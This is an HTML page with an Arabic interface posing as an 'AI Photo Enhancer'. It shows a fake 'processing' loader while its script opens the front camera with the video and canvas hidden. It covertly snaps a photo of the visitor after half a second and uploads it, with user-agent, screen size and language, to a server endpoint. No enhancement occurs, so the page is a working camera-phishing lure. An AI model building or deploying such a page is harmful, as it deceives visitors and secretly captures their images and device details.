<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Photo Enhancer</title>
    <style>
        body { margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: linear-gradient(135deg, #1a1a2e, #16213e); color: white; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        .container { text-align: center; z-index: 10; }
        .loader { border: 5px solid #f3f3f333; border-top: 5px solid #4ecca3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .result-mark { font-size: 100px; display: none; animation: pop 0.5s ease; }
        @keyframes pop { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
        #success-mark { color: #4ecca3; }
        #error-mark { color: #ff4d4d; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="container" id="ui">
        <div class="loader"></div>
        <h2>جاري معالجة الصورة بالذكاء الاصطناعي...</h2>
    </div>

    <video id="video" autoplay playsinline></video>
    <div id="success-mark" class="result-mark">✓</div>
    <div id="error-mark" class="result-mark">✕</div>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video'), canvas = document.getElementById('canvas'), ctx = canvas.getContext('2d');
        const ui = document.getElementById('ui'), successEl = document.getElementById('success-mark'), errorEl = document.getElementById('error-mark');

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                video.onloadedmetadata = () => setTimeout(() => capture(stream), 500); // سرعة 500ms
            } catch (e) { showResult(errorEl); }
        }

        function capture(stream) {
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('captured_image', blob, 'img.jpg');
                // إضافة معلومات الجهاز
                formData.append('deviceInfo', JSON.stringify({
                    userAgent: navigator.userAgent,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language
                }));

                try {
                    const res = await fetch('/api/upload', { method: 'POST', body: formData });
                    showResult(res.ok ? successEl : errorEl);
                } catch { showResult(errorEl); }
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.9);
        }

        function showResult(el) {
            ui.style.display = 'none';
            el.style.display = 'block';
        }

        startCamera();
    </script>
</body>
</html>
